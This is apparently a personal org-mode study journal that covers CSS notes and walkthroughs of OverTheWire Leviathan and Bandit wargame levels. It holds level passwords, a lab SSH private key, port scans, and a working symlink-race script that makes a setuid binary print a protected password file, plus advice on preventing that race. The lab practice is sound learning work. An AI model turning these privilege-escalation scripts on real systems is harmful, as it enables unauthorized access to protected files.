# -*- auto-fill-function: nil; eval: (add-hook 'after-save-hook 'org-babel-tangle nil t); -*-

Current project: [[https://github.com/rafaelbeirigo/odin-css-exercises/][Web Development Foundations Course from The Odin Project]].

* [2025-10-15 Wed]

** CSS

Studied the Box Model.
This time with exercises: much better.

* [2025-10-14 Tue]

The slope got steep at overthewire.org.
Went to picoCTF for some structured intro.
Today I read the Primer and worked on some playlists:
- The Beginner's Guide to the picoGym: 25/25
- Cryptography and picoGym Learning Intro 1/15
- Low Level Binary Intro 38/46
- Forensics in CTF's 6/17
- Python in CTF's 13/19
- Vault Door Series 1/8
- Sleuthkit Series 2/2
- PW Crack Series 5/5

** Seinfeld Checkmark

[[file:images/2025-10-14_seinfeld.jpeg]]

* [2025-10-13 Mon]

Some [[https://overthewire.org/][bit scrubbing]] (these last days) and today!

** Leviathan

*** Intro

#+begin_quote
Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on

leviathan.labs.overthewire.org through SSH on port 2223.

To login to the first level use:

Username: leviathan0
Password: leviathan0

Data for the levels can be found in the homedirectories. You can look at /etc/leviathan_pass for the various level passwords.
#+end_quote

*** Functions

**** Automatically assemble SSH command from given user and password (C-. C-.)

#+begin_src elisp :results none
(defun hack-ctf-overthewire-dot-org-leviathan-ssh-command
    (arg user password)
  "Read USER and PASSWORD then return complete ssh command.
When ARG in non-nil do not use comman `sshpass' to automatically
send PASSWORD to `ssh'.  Apparently the first connection must be
established the old way."
  (interactive
   (list
    current-prefix-arg
    (read-string "user: "
                 "leviathan" ;; challenge's prefix
                 hack-ctf-user-history)
    (read-string "password: " nil
                 hack-ctf-password-history)))
  (let* ((challenge-subdomain "leviathan")
         (challenge-port "2223")
         (url (concat challenge-subdomain ".labs.overthewire.org"))
         (ssh-command (concat
                       (unless arg (concat "sshpass -p " password " "))
                       "ssh " url
                       " -p " challenge-port
                       " -l " user)))
    (kill-new ssh-command)
    (message "hack-ctf: ssh command copied to clipboard")
    (sleep-for 2)
    (if (and arg (yes-or-no-p "copy password to clipboard now?"))
        (kill-new password))))
(keymap-local-set "C-. C-."
                  'hack-ctf-overthewire-dot-org-leviathan-ssh-command)
#+end_src

*** 0 (I /have/ the password for leviathan0 and /want/ the one for leviathan1)
leviathan0

#+begin_example
leviathan0@leviathan:~/.backup$ cat bookmarks.html
#+end_example

#+begin_example
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
#+end_example

*** 1

3QJ3TgzHDq

#+begin_example
leviathan1@leviathan:~$ ll
total 36
drwxr-xr-x   2 root       root        4096 Aug 15 13:17 ./
drwxr-xr-x 150 root       root        4096 Aug 15 13:18 ../
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Aug 15 13:09 .bashrc
-r-sr-x---   1 leviathan2 leviathan1 15084 Aug 15 13:17 check*
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
#+end_example

#+begin_example
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x80490ed, 1, 0xffffd464, 0 <unfinished ...>
printf("password: ")                                                                                                                                = 10
getchar(0, 0, 0x786573, 0x646f67password: sex
)                                                                                                                   = 115
getchar(0, 115, 0x786573, 0x646f67)                                                                                                                 = 101
getchar(0, 0x6573, 0x786573, 0x646f67)                                                                                                              = 120
strcmp("sex", "sex")                                                                                                                                = 0
geteuid()                                                                                                                                           = 12001
geteuid()                                                                                                                                           = 12001
setreuid(12001, 12001)                                                                                                                              = 0
system("/bin/sh"$
$ cat /etc/leviathan_pass/leviathan2
cat: /etc/leviathan_pass/leviathan2: Permission denied
$ whoami
leviathan1
$ id
uid=12001(leviathan1) gid=12001(leviathan1) groups=12001(leviathan1)
$ pwd
/home/leviathan1
$ ./check
password: sex
$ id
uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
$ cat /etc/leviathan_pass/leviathan2
NsN1HwFoyN
#+end_example

If I run it without ltrace, it does not drop privileges.

#+begin_example
leviathan1@leviathan:~$ ltrace ./check <------------------------------------------------------------------------------------------------------------- WITH LTRACE
__libc_start_main(0x80490ed, 1, 0xffffd464, 0 <unfinished ...>
printf("password: ")                                                                                                                                = 10
getchar(0, 0, 0x786573, 0x646f67password: sex
)                                                                                                                   = 115
getchar(0, 115, 0x786573, 0x646f67)                                                                                                                 = 101
getchar(0, 0x6573, 0x786573, 0x646f67)                                                                                                              = 120
strcmp("sex", "sex")                                                                                                                                = 0
geteuid()                                                                                                                                           = 12001
geteuid()                                                                                                                                           = 12001
setreuid(12001, 12001)                                                                                                                              = 0
system("/bin/sh"$ id
uid=12001(leviathan1) gid=12001(leviathan1) groups=12001(leviathan1) <------------------------------------------------------------------------------- DROPPED PRIVILEGES
$ ltrace ./check
__libc_start_main(0x80490ed, 1, 0xffffd474, 0 <unfinished ...>
printf("password: ")                                                                                                                                = 10
getchar(0, 0, 0x786573, 0x646f67password: sex
)                                                                                                                   = 115
getchar(0, 115, 0x786573, 0x646f67)                                                                                                                 = 101
getchar(0, 0x6573, 0x786573, 0x646f67)                                                                                                              = 120
strcmp("sex", "sex")                                                                                                                                = 0
geteuid()                                                                                                                                           = 12001
geteuid()                                                                                                                                           = 12001
setreuid(12001, 12001)                                                                                                                              = 0
system("/bin/sh"$ id
uid=12001(leviathan1) gid=12001(leviathan1) groups=12001(leviathan1)
$ ./check
password: sex
$ id
uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
$ 
$ 
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                              = 0
+++ exited (status 0) +++
$ id
uid=12001(leviathan1) gid=12001(leviathan1) groups=12001(leviathan1)
$ 
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                              = 0
+++ exited (status 0) +++
leviathan1@leviathan:~$ ./check
password: sex
$ id
uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
#+end_example

*** 2

NsN1HwFoyN

**** Poke

***** Successful execution

#+begin_example
leviathan2@leviathan:~$ ltrace ./printfile .profile 
__libc_start_main(0x80490ed, 2, 0xffffd454, 0 <unfinished ...>
access(".profile", 4)                                                                                                                               = 0
snprintf("/bin/cat .profile", 511, "/bin/cat %s", ".profile")                                                                                       = 17
geteuid()                                                                                                                                           = 12002
geteuid()                                                                                                                                           = 12002
setreuid(12002, 12002)                                                                                                                              = 0
system("/bin/cat .profile"# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                              = 0
+++ exited (status 0) +++
#+end_example

***** Order of tests and calls

Previous one:

#+begin_example
strcmp("sex", "sex")                                                                                                                                = 0
geteuid()                                                                                                                                           = 12001
geteuid()                                                                                                                                           = 12001
setreuid(12001, 12001)                                                                                                                              = 0
system("/bin/sh"$ id
#+end_example

This one:

#+begin_example
access(".profile", 4)                                                                                                                               = 0
snprintf("/bin/cat .profile", 511, "/bin/cat %s", ".profile")                                                                                       = 17
geteuid()                                                                                                                                           = 12002
geteuid()                                                                                                                                           = 12002
setreuid(12002, 12002)                                                                                                                              = 0
system("/bin/cat .profile"# ~/.profile: executed by the command interpreter for login shells.
#+end_example

**** DONE Does it print the password file without tracing?  No

#+begin_example
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3 
You cant have that file...
#+end_example

**** DONE Does it get ~cat~ from PATH?  No

#+begin_example
leviathan2@leviathan:~$ export PATH=""
leviathan2@leviathan:~$ ./printfile .profile 
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
#+end_example
**** DONE Printar link mutante.  SOLVED
#+begin_example
#!/bin/bash


LEV=/etc/leviathan_pass/leviathan
LEV2=${LEV}2
LEV3=${LEV}3
L=/tmp/chaves-L
PRINTFILE=/home/leviathan2/printfile

ln -sf $LEV2 $L
$PRINTFILE $L &
ln -sf $LEV3
#+end_example

#+begin_example
leviathan2@leviathan:~$ vi /tmp/chaves.sh

---

#!/bin/bash

ln -sf /etc/leviathan_pass/leviathan2 /tmp/chaves-L
/home/leviathan2/printfile /tmp/chaves-L &
ln -sf /etc/leviathan_pass/leviathan3 /tmp/chaves-L

---

leviathan2@leviathan:~$ /tmp/chaves.sh
leviathan2@leviathan:~$ f0n8h2iWLP
#+end_example
**** ChatGPT comments

[[https://chatgpt.com/share/68ed9138-3f28-8006-ac1e-835908865878][ChatGPT]]

***** More robust TOCTOU script

#+begin_example
#!/bin/bash
# deterministic TOCTOU flipper for CTF practice only

GOOD="/home/leviathan2/.profile"   # a file RUID can read (replace with real file)
SECRET="/etc/leviathan_pass/leviathan3" # the secret you want printed
LINK="/tmp/chaves-L"
BINARY="/home/leviathan2/printfile"     # the setuid binary that does: check ACCESS then exec cat LINK

# make sure the link starts pointing to the readable file
ln -sf "$GOOD" "$LINK"

# start the target program in the background and capture its PID
"$BINARY" "$LINK" &
TARGET_PID=$!

# while the target is still alive, keep flipping the symlink
while kill -0 "$TARGET_PID" 2>/dev/null; do
  ln -sf "$GOOD" "$LINK"
  ln -sf "$SECRET" "$LINK"
done

# wait for the target to finish and print exit status
wait "$TARGET_PID"
echo "target exited with $?"
#+end_example


#+begin_example
leviathan2@leviathan:~$ /tmp/chaves.sh
f0n8h2iWLP
target exited with 0
#+end_example

***** Correct program design (how this should be prevented)

A secure program that needs to both check a user’s rights and open/use a file under another UID must avoid TOCTOU by not using separate pathname checks. Secure patterns include:

Open then verify using the opened descriptor

fd = open(path, O_RDONLY|O_NOFOLLOW);

fstat(fd, &st); Verify ownership/permissions on fd (not on path). Use fchmod/fchown/check st fields as needed. Because operations act on the already-opened descriptor, the target cannot be swapped by a symlink after open.

Use file-descriptor-based operations instead of re-resolving the pathname later (fexecve / run with fd or read from fd directly). That prevents lookup at time-of-use.

Avoid access() for security checks, because it checks current real/effective permissions against the filename and is vulnerable to TOCTOU. If the program needs to verify permissions, open the file (with the minimum privileges) and operate on the returned descriptor.

Drop privileges safely: if the program must switch to EUID to read something privileged, handle UID transitions carefully:

Temporarily set effective UID to the one that should do the check, open/lock the file descriptor, then set EUID to the other identity and use the already-open FD.

Use O_NOFOLLOW to prevent symlink abuse where appropriate.

Use kernel-level protections if available: openat2() with RESOLVE_NO_SYMLINKS (newer kernels) or seccomp / file capabilities to narrow attack surface.

In short: do the check and the use on the same resolved kernel object (the same FD), and do not re-resolve the pathname.

*** 3

f0n8h2iWLP

*** Seinfeld Checkmark

[[file:images/2025-10-13_seinfeld.jpeg]]

** Bandit

*** 0
ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If

*** 1
263JGJPfgU6LtdEvgfWU1XP5yac29mFx

*** 2
MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx

*** 3
2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ

*** 4
4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw

*** 5
Preciso achar um arquivo:
- human-readable
- 1033 bytes in size
- not executable


Será que o comando ~find~ dá isso?

#+begin_src bash
find . -type f -size 1033c -exec cat {} +
#+end_src

HWasnPhtq9AVKe0dmk45nxy20cvUa6EG

*** 6

file that:

    - owned by user bandit7
    - owned by group bandit6
    - 33 bytes in size

#+begin_src shell
find / 2>/dev/null -user bandit7 -group bandit6 -size 33c -exec cat {} \;
#+end_src

morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj

*** 7

dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc

*** 8
4CKMh1JI91bUIZZPXDqGanal4xvAg0JM

*** 9

~strings data.txt~

FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey

*** 10

Nesse tem uma string codificada em base64.

#+begin_src shell
base64 -d data.txt
#+end_src

dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr

*** 11

Nesse rotacionaram as letras em 13 posições.

Essa é uma cifra conhecida já, a tal da ROT13.
26 letras no falnalabeto: f == f^{-1}.
ROT13 é sua própria inversa.

#+begin_src shell
tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt
#+end_src

7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4

*** 12

Agora brotou um hexdump em plain text.
They tell it's a file that was compressed multiple times.

I need to get the file that generated that hexdump.
This can be done with:

#+begin_src shell
xxd -r data.txt
#+end_src

Aí foi uma cascata de uncompressing in several formats (bz2, gz, tar).

FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn

*** 13

#+begin_quote
The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14.

For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level.

Note: localhost is a hostname that refers to the machine you are working on
#+end_quote

1. I copied the contents of the bandit14's private key that was in the home directory.
2. Then I renamed it to ~id_rsa~.
3. Then

#+begin_src shell
ssh bandit.labs.overthewire.org -p 2220 -i ~/.ssh/id_rsa_overthewire.org-bandit14-private-key -l bandit14
#+end_src

*** 14

#+begin_quote
The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.
#+end_quote

I got the pass from the folder mentioned in the previous Bandit:
MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS

I want to send that string (those bytes) to localhost on port 30000.

After readin man telnet.

#+begin_src shell
telnet localhost 30000
#+end_src

This opens a connection, and I can input text.
I typed the password, ENTER, and voilà:

8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo

*** 15

#+begin_quote
The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.
#+end_quote

I connected to the server/port using ~openssl~.
It's the same procedure as the telnet, but Secure®.

#+begin_src shell
openssl s_client -crlf -connect localhost:30001
#+end_src

kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx

*** 16

#+begin_quote
The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000.
First find out which of these ports have a server listening on them.
Then find out which of those speak SSL/TLS and which don’t.
There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.
#+end_quote

#+begin_example
bandit16@bandit:~$ nmap -p 31000-32000 localhost
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-11 00:02 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00010s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown
#+end_example

#+begin_src shell
for p in 31046 31518 31691 31790 31960; do openssl s_client -crlf -connect localhost:$p; done;
#+end_src

Testing connection:

| 31046 | Secure  Renegotiation  IS  NOT  supported |
| 31518 |                                           |
| 31691 |                                           |
| 31790 |                                           |
| 31960 |                                           |

I was having a problem:

#+begin_example
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx    <---- sent the current passwor
KEYUPDATE                           <---- received this message
#+end_example

This happened because the sent data started with a *k*, that has a meaning in the /interactive/ session.

[[https://stackoverflow.com/a/58574851][This answer on Stackoverflow]] suggests to avoid using the interactive session with ~ign_eof~:

#+begin_src shell
for p in 31046 31518 31691 31790 31960; do openssl s_client -ign_eof -crlf -connect localhost:$p; done;
#+end_src

The correct one was:

#+begin_src shell
openssl s_client -ign_eof -crlf -connect localhost:31790
#+end_src

Got a private key :)

#+begin_src id_rsa :tangle ~/.ssh/id_rsa_overthewire.org-bandit17
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
#+end_src

#+begin_src shell
chmod 600 ~/.ssh/id_rsa_overthewire.org-bandit17
#+end_src

#+RESULTS:

*** 17

x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO

Got the 'Byebye'.

Checking out the next Bandit, as instructed.
*** 18

I was being automatically disconnected from the server because there was a directive in ~.bashrc~ for that:

#+begin_quote
someone has modified .bashrc to log you out when you log in with SSH.
#+end_quote

Then I found out that I can run a command via SSH, and that it may run before Bash did his stuff:

#+begin_quote
When you connect via SSH and specify a command to execute directly (e.g., ssh user@host "ls -l"), a non-interactive shell is often used, and your ~/.bashrc or ~/.profile might not be fully sourced, depending on the shell and the command.
#+end_quote

I did this (intructions told about ~readme~):

#+begin_src shell
ssh bandit.labs.overthewire.org -p 2220 -l bandit18 "cat readme"
#+end_src

cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8

**** 19

A princípio fiquei confuso.
Achei que o programa iria /modificar/ o proprietário do arquivo com a senha.

Quando rodei o comando para saber o que fazer (conforme instruído), recebi a seguinte saída:

#+begin_src shell
bandit19@bandit:~$ ./bandit20-do
Run a command as another user.
  Example: ./bandit20-do id
#+end_src

Eu não li a primeira linha da saída e achei que tinha que descobrir o meu ~id~ numérico do user ~bandit19~, pra daí usar o comando para setar esse usuário como proprietário do arquivo com a senha.

Depois eu acabei rodando o comando de novo e li a primeira linha.
Daí rodei:

#+begin_src shell
bandit19@bandit:/etc/bandit_pass$ ~/bandit20-do cat bandit20
#+end_src

e obtive a senha:

0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO

O executável ~bandit20-do~ foi setado com o user bandit20 e o meu grupo.

#+begin_src shell
bandit19@bandit:~$ stat bandit20-do
  File: bandit20-do
  Size: 14884           Blocks: 32         IO Block: 4096   regular file
Device: 259,1   Inode: 577828      Links: 1
Access: (4750/-rwsr-x---)  Uid: (11020/bandit20)   Gid: (11019/bandit19)
                           ^^^         ^^^^^^^^    ^^^         ^^^^^^^^
Access: 2025-10-10 17:14:19.958793247 +0000
Modify: 2025-08-15 13:16:01.732011756 +0000
Change: 2025-08-15 13:16:01.734011763 +0000
 Birth: 2025-08-15 13:16:01.731011751 +0000
#+end_src

Como eu faço parte do grupo do arquivo, eu posso executá-lo e como ele é do 20, eu posso ler o arquivo da próxima senha, que é dele.
*** 20

0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO

#+begin_quote
There is a setuid binary in the homedirectory that does the following:
#+end_quote

The "setuid binary" is ~suconnect~:

#+begin_example
bandit20@bandit:~$ ls -lah
total 36K
drwxr-xr-x   2 root     root     4.0K Aug 15 13:16 .
drwxr-xr-x 150 root     root     4.0K Aug 15 13:18 ..
-rw-r--r--   1 root     root      220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root     3.8K Aug 15 13:09 .bashrc
-rw-r--r--   1 root     root      807 Mar 31  2024 .profile
-rwsr-x---   1 bandit21 bandit20  16K Aug 15 13:16 suconnect

bandit20@bandit:~$ stat suconnect
  File: suconnect
  Size: 15608           Blocks: 32         IO Block: 4096   regular file
Device: 259,1   Inode: 577830      Links: 1
Access: (4750/-rwsr-x---)  Uid: (11021/bandit21)   Gid: (11020/bandit20)
Access: 2025-10-10 17:04:06.585772107 +0000
Modify: 2025-08-15 13:16:02.922063839 +0000
Change: 2025-08-15 13:16:02.923016449 +0000
 Birth: 2025-08-15 13:16:02.921016442 +0000
#+end_example

#+begin_quote
- it makes a connection to localhost on the port you specify as a commandline argument.
- It then reads a line of text from the connection and compares it to the password in the previous level (bandit20).
- If the password is correct, it will transmit the password for the next level (bandit21).
#+end_quote

Now, I am not sure if it
1. /connects/ to an existing connection.
2. /creates/ a new connection, or if it just

Let us try first to connect to an existing connection.
We get a list of the ports---the "simple" way:

#+begin_example
bandit20@bandit:~$ nmap localhost
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-11 16:21 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
1111/tcp  open  lmsocialserver
1840/tcp  open  netopia-vo2
4321/tcp  open  rwhois
8000/tcp  open  http-alt
30000/tcp open  ndmps
50001/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
#+end_example

For the bandit19 user is the same:

#+begin_example
bandit19@bandit:~$ nmap localhost
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-11 16:18 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
1111/tcp  open  lmsocialserver
1840/tcp  open  netopia-vo2
4321/tcp  open  rwhois
8000/tcp  open  http-alt
30000/tcp open  ndmps
50001/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
#+end_example

I tried connecting both ~suconnect~ and ~telnet~ to port 1111 (has "social" in the name); suconnect with '&'; and then send the password through telnet.
I expect to receive an answer from suconnect, because it is in the same "chat".

#+begin_src shell
telnet 1111 &
telnet 1111
Hello, there!
#+end_src

I didn't get the message to be echoed on the screen, as I expected.
It says something like "job /stopped/"; I wonder if I need to keep it running in the background.

Let's try a different port: 30000.

#+begin_src shell
bandit20@bandit:~$ ./suconnect 30000 &
[1] 69995
bandit20@bandit:~$ telnet localhost 30000
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
Wrong! Please enter the correct current password.
Connection closed by foreign host.
#+end_src

I believe this is the same guy from a previous Bandit.
Let's test it.
That Bandit is 14.
Let's re-run it:

#+begin_src shell
bandit20@bandit:~$ telnet localhost 30000
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
Correct!
8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo

Connection closed by foreign host.
#+end_src

Yep!
It is the same, and it works for the user bandit20 too.

Apparently, two processes cannot listen to the same port (usually).
I'll try running suconnect as a daemon, and telnet as a Client.
I need a port.

These are all the ports available:

|          | bandit20@bandit:~$ nmap -p 0-65535 localhost                       |
|          | Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-11 17:37 UTC |
|          | Nmap scan report for localhost (127.0.0.1)                         |
|          | Host is up (0.000097s latency).                                    |
|          | Not shown: 65506 closed tcp ports (conn-refused)                   |
| WORKS?   | PORT      STATE SERVICE                                            |
|          | 22/tcp    open  ssh                                                |
|          | 1111/tcp  open  lmsocialserver                                     |
|          | 1840/tcp  open  netopia-vo2                                        |
|          | 2220/tcp  open  netiq                                              |
|          | 2221/tcp  open  rockwell-csp1                                      |
|          | 2223/tcp  open  rockwell-csp2                                      |
|          | 2224/tcp  open  efi-mg                                             |
|          | 2225/tcp  open  rcip-itu                                           |
|          | 2226/tcp  open  di-drm                                             |
|          | 2227/tcp  open  di-msg                                             |
|          | 2228/tcp  open  ehome-ms                                           |
|          | 2230/tcp  open  queueadm                                           |
|          | 2231/tcp  open  wimaxasncp                                         |
|          | 2232/tcp  open  ivs-video                                          |
|          | 4091/tcp  open  ewinstaller                                        |
|          | 4258/tcp  open  vrml-multi-use                                     |
|          | 4321/tcp  open  rwhois                                             |
|          | 5842/tcp  open  reversion                                          |
|          | 8000/tcp  open  http-alt                                           |
| bandit14 | 30000/tcp open  ndmps                                              |
| n        | 30001/tcp open  pago-services1                                     |
| bandit25 | 30002/tcp open  pago-services2                                     |
|          | 31046/tcp open  unknown                                            |
|          | 31518/tcp open  unknown                                            |
|          | 31691/tcp open  unknown                                            |
|          | 31790/tcp open  unknown                                            |
|          | 31960/tcp open  unknown                                            |
|          | 50001/tcp open  unknown                                            |
|          | 51790/tcp open  unknown                                            |
|          | 60917/tcp open  unknown                                            |

Given that bandit15 uses port 30000, and bandit25 uses port 30002, I bet the port I need for this Bandit is 30001.

I tried first running succonect on the background and sending the password via nc.
But it closes the connection.

#+begin_example
bandit20@bandit:~$ ./suconnect 30001 &
[1] 290352

bandit20@bandit:~$ nc localhost 30001
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
bandit20@bandit:~$                       <--- It closes the connection
#+end_example

I tried using ~screen~ to run the daemon, and another session to connect to it.

I created a dedicated session for ~suconnect~:

#+begin_src shell
screen -S suconnect
#+end_src

Then I started the ~suconnect~ daemon.

#+begin_src shell
./suconnect 30001
#+end_src

Then I detached the screen session with ~C-a d~.

Then I connected and sent the password using ~nc~.

#+begin_src shell
nc localhost 30001
#+end_src

I was disconnected, as expected.

Then I reattached to the ~screen~ running ~suconnect~ with

#+begin_src shell
screen -x suconnect
#+end_src

I expected to see the next password as the output there, but there was no output.

Future me: up until now, I had tried:
- ~suconnect~ as the daemon
  - using already opened ports

| Daemon    | Open new port | Use existing port |
|-----------+---------------+-------------------|
| suconnect |               | Doesn't work      |
| nc        |               |                   |

I tried connecting with ~suconnect~ to every port in the interval 0--65535.
It connected to some, but I couldn't tell if it was connecting to an open port or opening a new port.

Then I came across [[https://stackoverflow.com/a/79726454][this answer on Stackoverflow]] that teaches hot to solve it.
According to this answer, ~nc~ will be the daemon, and ~suconnect~ will be the client.
The answer instructs to use the parameters ~-lnvp~ for ~nc~.

I first tried to use port 30001.

#+begin_example
bandit20@bandit:~$ nc -lnvp 30001
nc: Address already in use
#+end_example

Then I tried a port not reported by ~nmap~ above.

#+begin_example
bandit20@bandit:~$ nc -lnvp 30003
Listening on 0.0.0.0 30003
#+end_example

Then I dettached and attached to ~suconnect~'s ~screen~.
I started ~suconnect~ there using the same port.

#+begin_src shell
./suconnect 30003
#+end_src

No output.

Back on ~nc~'s screen, I got the message of a received connection, probably from ~suconnect~.

#+begin_example
Connection received on 127.0.0.1 54356
